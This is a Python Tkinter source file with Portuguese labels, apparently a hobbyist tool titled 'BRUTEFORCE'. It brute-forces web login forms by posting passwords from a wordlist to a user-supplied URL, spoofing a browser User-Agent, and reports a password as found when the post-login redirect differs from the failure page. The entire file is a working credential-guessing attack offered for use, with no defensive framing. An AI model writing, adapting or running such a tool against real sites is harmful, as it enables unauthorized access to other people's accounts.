'''

CRIADO POR -> Hirt Dond
VULGO -> Homer

favor não remover creditos <3 se precisar de ajuda só add no face

'''

from tkinter import *
import requests
import time

txtaviso = "Quando você iniciar o programa ele vai travar\n enquanto ele estiver travado, ele está \ntentando as senhas da wordlist"
txtcredts = "CREDITOS: Hirt Dond"

x = 5
y = 10
count = 0
header = {'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
          'accept-language':'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'}

def btaviso():
    aviso = Tk()
    aviso.geometry("300x300")
    aviso.title("JANELA DE AVISO")
    aviso["bg"] = "black"
    lbav = Label(aviso, text=txtaviso, bg="black", fg="white")
    lbav.place(x=25,y=y)

def btfirst():
    postuser = EnPUser.get()
    postpass = EnPPass.get()
    user = EnUser.get()
    path = EnWl.get()
    url = EnURL.get()
    enr = EnRET.get()
    with requests.Session() as s:
        try:
            post = s.post(url, data={postuser: 'dawdaw', postpass: 'dwdwad'})
        except:
            EnURL["fg"] = "red"
        else:
            EnURL["fg"] = "green"
            LbAviso["text"] = (r"Verifique se as informações estão corretas, algo errado, pode alterar o resultado.")
    if enr == '':
        with requests.Session() as s:
            post = s.post(url,data={postuser:'dawdaw',postpass:'dwdwad'})
            enr = post.url
    try:
        wordlist = open(path, 'r').readlines()
    except:
        EnWl["fg"] = "red"
        LbAviso["text"] = (r"ERRO: WordList não encontrada. EX: C:\Users\usuario\Desktop\wordlist.txt")
    else:
        EnWl["fg"] = "green"
        LbAviso["text"] = (r"Verifique se as informações estão corretas, algo errado, pode alterar o resultado.")
        run(wordlist, url, user, postuser,postpass, enr)


def run(wordlist, url, user, postuser, postpass, linkr):
    with requests.Session() as s:
        for c in wordlist:
            global count
            g = wordlist[wordlist.index(c)].replace('\n','').split()
            post = s.post(url,data={postuser:user,postpass:g}, headers=header)
            if post.url == linkr:
                pass
            else:
                list.insert(count,'Senha encontrada {} '.format(g))
                break

def btlimpar():
    list.delete(0)

janela = Tk()
janela.geometry("439x272")
janela["bg"] = "black"
janela.title("BRUTEFORCE -> Creditos: HomerSimp")

#LABELS
LbWl = Label(janela, text="WordList: ", fg="white",bg="black")#3
LbURL = Label(janela, text="URL: ",fg="white",bg="black")#2
LbUser = Label(janela, text="Usuario: ",fg="white",bg="black")#1
LbPUser = Label(janela, text="POST User: ",fg="white",bg="black")#4
LBPPass = Label(janela, text="POST Pass: ",fg="white",bg="black")#5
LbAviso = Label(janela, text="Verifique se as informações estão corretas, algo errado, pode alterar o resultado.", fg="white",bg="black")
LbRET = Label(janela, text="Link Erro: ",fg="white",bg="black")

#LABEL:  *
LbObg1 = Label(janela, text="*",fg="red",bg="black")
LbObg2 = Label(janela, text="*",fg="red",bg="black")
LbObg3 = Label(janela, text="*",fg="red",bg="black")
LbObg4 = Label(janela, text="*",fg="red",bg="black")
LbObg5 = Label(janela, text="*",fg="red",bg="black")

'''

CRIADO POR -> Hirt Dond
VULGO -> Homer

favor não remover creditos <3 se precisar de ajuda só add no face

'''

#ENTRYS
EnWl = Entry(janela, width=40, fg="green",bg="black") #3
EnURL = Entry(janela, width=40, fg="green",bg="black") #2
EnUser = Entry(janela, width=40, fg="green",bg="black") #1
EnPUser = Entry(janela, width=40, fg="green",bg="black") #4
EnPPass = Entry(janela, width=40, fg="green",bg="black") #5
EnRET = Entry(janela, width=40, fg="green",bg="black")#6

#BUTTONS
btstart = Button(janela, text="INICIAR", width=10, height=2,fg="white",bg="black", command=btfirst) #8
btlimpar = Button(janela, text="LIMPAR", width=10, height=2,fg="white",bg="black", command=btlimpar) #9
btaviso = Button(janela, text="AVISO", width=10, height=1,fg="white",bg="black", command=btaviso)

#LISTBOX
list = Listbox(janela, width=52,height=5,fg="green",bg="black" ) #7


#PLACES

    #login OK
LbUser.place(x=x,y=y)
EnUser.place(x=x+70,y=y)
LbObg1.place(x=x+315,y=y)
btaviso.place(x=x+340,y=y)

    #URL OK
LbURL.place(x=x, y=y+20)
EnURL.place(x=x+70, y=y+20)
LbObg2.place(x=x+315,y=y+20)

    #Wordlist OK
LbWl.place(x=x, y=y+40)
EnWl.place(x=x+70, y=y+40)
LbObg3.place(x=x+315,y=y+40)

    #POST_USER
LbPUser.place(x=x, y=y+60)
EnPUser.place(x=x+70, y=y+60)
LbObg4.place(x=x+315,y=y+60)

    #POST_PASS
LBPPass.place(x=x, y=y+80)
EnPPass.place(x=x+70, y=y+80)
LbObg5.place(x=x+315,y=y+80)

    #LINK RETORNO
LbRET.place(x=x,y=y+100)
EnRET.place(x=x+70,y=y+100)

    #LIST BOX
list.place(x=x+5,y=y+130)

    #BUTTONS
btstart.place(x=x+340,y=y+128)
btlimpar.place(x=x+340,y=y+178)

    #AVISOS
LbAviso.place(x=x,y=y+230)

janela.mainloop()

'''

CRIADO POR -> Hirt Dond
VULGO -> Homer

favor não remover creditos <3 se precisar de ajuda só add no face

'''
